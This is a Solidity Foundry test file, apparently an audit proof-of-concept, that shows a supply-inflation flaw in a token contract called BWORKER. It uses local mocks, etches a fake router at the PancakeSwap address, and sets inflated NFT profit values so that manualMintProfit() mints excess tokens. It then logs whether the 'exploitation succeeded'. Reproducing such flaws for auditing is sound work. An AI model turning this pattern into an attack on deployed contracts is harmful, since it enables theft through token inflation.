// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/BWORKER.sol";

contract Fixed_TSED_Test is Test {
    BWORKER token;
    MockNFT nft;
    MockPair pair;

    uint256 constant EPOCHS = 3;
    uint256 constant INFLATED_PROFIT = 1000 ether;
    uint256 constant NFT_PRICE = 0.1 ether;

    address deployer = address(0x01);
    address validator = address(0xBEEF);
    address treasury = address(0x02);

    // PancakeSwap V2 Router on BSC. BWORKER's constructor performs an
    // external call into this hard-coded address.
    address constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    // Reads the deployed/runtime bytecode of an address (immutables included).
    function _getRuntimeCode(address target) internal view returns (bytes memory code) {
        uint256 size;
        assembly {
            size := extcodesize(target)
        }
        code = new bytes(size);
        assembly {
            extcodecopy(target, add(code, 0x20), 0, size)
        }
    }

    function setUp() public {
        vm.startPrank(deployer);

        // Deploy mock dependencies
        nft = new MockNFT();
        pair = new MockPair();

        // -----------------------------------------------------------------
        // FIX: place a working mock at the PancakeSwap router address so that
        // `new BWORKER()` does not revert with "call to non-contract address".
        // -----------------------------------------------------------------
        MockFactory mockFactory = new MockFactory();
        mockFactory.setPair(address(pair));
        MockWETH mockWeth = new MockWETH();

        // The factory/WETH addresses are stored as immutables inside the runtime
        // bytecode, so `vm.etch` (which copies code but NOT storage) preserves them.
        MockRouter routerImpl = new MockRouter(address(mockFactory), address(mockWeth));
        vm.etch(PANCAKE_ROUTER, _getRuntimeCode(address(routerImpl)));

        // Deploy token contract (its constructor can now talk to a real router mock)
        token = new BWORKER();

        // Configure token with mock contracts
        token.setNFTContract(address(nft));
        token.setPairContract(address(pair));

        // Setup token reserves
        pair.setToken0(address(token));
        pair.setReserves(1000 ether, 1 ether);
        token.setGameValidator(validator, true);

        // Initialize token state
        token.setWhiteList(address(pair), true);
        token.setWhiteList(treasury, true);
        nft.setEpochData(EPOCHS, INFLATED_PROFIT);

        vm.warp(block.timestamp + 365 days); // Advance time for epochs
        vm.stopPrank();
    }

    function test_TotalSupplyManipulation() public {
        console.log("=== (i) BEFORE trigger: state snapshot ===");
        uint256 supplyBefore = token.totalSupply();
        console.log("token.totalSupply() before:", supplyBefore);
        console.log("nft.totalProfitAt(1) before:", nft.totalProfitAt(1));
        console.log("nft.totalProfitAt(2) before:", nft.totalProfitAt(2));

        console.log("=== (ii) TRIGGER: manipulate NFT profit values ===");
        nft.setTotalProfitAt(1, INFLATED_PROFIT * 100);
        nft.setTotalProfitAt(2, INFLATED_PROFIT * 100);
        console.log("nft.totalProfitAt(1) after manipulation:", nft.totalProfitAt(1));
        console.log("nft.totalProfitAt(2) after manipulation:", nft.totalProfitAt(2));

        // Snapshot immediately before the actual mint (baseline for the delta)
        uint256 supplyBeforeMint = token.totalSupply();
        console.log("token.totalSupply() immediately before mint:", supplyBeforeMint);

        console.log("=== (ii) TRIGGER: validator calls manualMintProfit() ===");
        vm.prank(validator);
        token.manualMintProfit();

        console.log("=== (iii) AFTER trigger: state snapshot ===");
        uint256 supplyAfter = token.totalSupply();
        console.log("token.totalSupply() after:", supplyAfter);

        // ----- (iv) comparison verdict -----
        uint256 delta = supplyAfter - supplyBeforeMint;
        bool changed = supplyAfter > supplyBeforeMint;

        console.log("totalSupply delta caused by manualMintProfit():", delta);
        console.log("State changed:", changed ? "YES" : "NO");
        console.log("Exploitation succeeded:", changed ? "YES" : "NO");

        if (changed) {
            console.log(
                "Vulnerability Exists: manualMintProfit() inflated totalSupply using attacker-controlled NFT profit values"
            );
        } else {
            console.log("Vulnerability not Exist: manualMintProfit() did not change totalSupply");
        }
    }
}

// Minimal PancakeSwap-router stand-in. factory/WETH are immutables so their
// values survive `vm.etch` (code is copied, storage is not).
contract MockRouter {
    address public immutable factoryAddr;
    address public immutable wethAddr;

    constructor(address _factory, address _weth) {
        factoryAddr = _factory;
        wethAddr = _weth;
    }

    function factory() external view returns (address) {
        return factoryAddr;
    }

    function WETH() external view returns (address) {
        return wethAddr;
    }

    fallback() external payable {}
    receive() external payable {}
}

contract MockFactory {
    address public pair;

    function setPair(address _pair) external {
        pair = _pair;
    }

    function createPair(address, address) external returns (address) {
        if (pair == address(0)) {
            pair = address(new MockPair());
        }
        return pair;
    }

    function getPair(address, address) external view returns (address) {
        return pair;
    }
}

contract MockWETH {
    function balanceOf(address) external pure returns (uint256) { return 0; }
    function transfer(address, uint256) external pure returns (bool) { return true; }
    function transferFrom(address, address, uint256) external pure returns (bool) { return true; }
    function approve(address, uint256) external pure returns (bool) { return true; }
    function decimals() external pure returns (uint8) { return 18; }
    fallback() external payable {}
    receive() external payable {}
}

contract MockNFT {
    uint256 public current;
    mapping(uint256 => uint256) public totalProfitAt;

    function setTotalProfitAt(uint256 epoch, uint256 profit) external {
        totalProfitAt[epoch] = profit;
    }

    function setEpochData(uint256 epochs, uint256 profit) external {
        current = epochs + 1;
        for (uint256 i = 1; i <= epochs; i++) {
            totalProfitAt[i] = profit;
        }
    }
}

contract MockPair {
    address public token0;
    uint112 private reserve0;
    uint112 private reserve1;
    uint32 blockTimestamp = uint32(block.timestamp);

    function token1() external pure returns (address) {
        return address(1);
    }

    function setToken0(address _token0) public {
        token0 = _token0;
    }

    function setReserves(uint112 _reserve0, uint112 _reserve1) public {
        reserve0 = _reserve0;
        reserve1 = _reserve1;
        blockTimestamp = uint32(block.timestamp);
    }

    function getReserves() external view returns (uint112, uint112, uint32) {
        return (reserve0, reserve1, blockTimestamp);
    }
}